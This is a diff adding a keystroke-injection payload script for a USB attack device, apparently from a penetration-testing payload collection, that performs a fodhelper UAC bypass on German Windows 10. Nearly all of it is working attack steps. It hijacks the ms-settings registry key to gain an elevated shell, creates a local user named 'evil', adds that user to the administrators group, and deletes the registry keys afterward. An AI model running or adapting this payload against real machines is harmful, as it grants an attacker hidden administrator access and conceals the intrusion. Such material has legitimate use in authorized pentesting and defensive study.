@@ -1,0 +1,71 @@
+#!/bin/bash
+# Title: fodhelperUACBypass Windows 10
+# Author: Pentestit.de
+# Version: 0.1
+# Target: Windows 10
+#
+# Christian discovered that during the execution of the fodhelper.exe binary, Windows 10 would look at two registry keys
+# for additional commands to execute when launching the file. He was able to edit the value of one of those registry keys
+# and to pass on custom commands that would be executed in the elevated context of the fodhelper.exe file
+# See https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/ for more information
+#
+# The current user has to be member of the local administrator group for this to work - OS Win 10
+# This script is written for German Win 10 systems.
+#
+# Blue --- Setup Registry keys
+# Yellow --- Start fodhelper.exe and add new user
+# White --- Clean up
+# Green --- Done
+ATTACKMODE HID
+
+Q SET_LANGUAGE de
+
+# Create registry keys
+LED B
+Q DELAY 2000
+Q GUI
+Q DELAY 500
+Q STRING powershell
+Q ENTER
+Q DELAY 5000
+Q STRING New\-Item \-Path \"HKCU\:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -\Value \"cmd \/c start powershell.exe\" \-Force
+Q ENTER
+Q DELAY 500
+Q STRING New\-ItemProperty \-Path \"HKCU\:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" \-Name \"DelegateExecute\" \-Value \"\" \-Force
+Q ENTER
+Q DELAY 500
+Q STRING Exit
+Q ENTER
+Q DELAY 5000
+
+# Start Fodhelper.exe and add new user
+LED Y
+Q GUI
+Q DELAY 200
+Q STRING powershell Start-Process \"C\:\\Windows\\System32\\fodhelper.exe\"
+Q ENTER
+Q DELAY 10000
+Q STRING net user evil evil /add
+Q ENTER
+Q DELAY 500
+Q STRING net localgroup Administratoren evil /add
+Q ENTER
+Q DELAY 500
+Q STRING Exit
+Q ENTER
+Q DELAY 200
+
+# Clean up
+LED W
+Q GUI
+Q DELAY 500
+Q STRING powershell
+Q ENTER
+Q DELAY 5000
+Q STRING Remove\-Item \"HKCU\:\\Software\\Classes\\ms\-settings\\\" \-Recurse \-Force
+Q ENTER
+Q STRING Exit
+Q ENTER
+
+# Done
+LED G
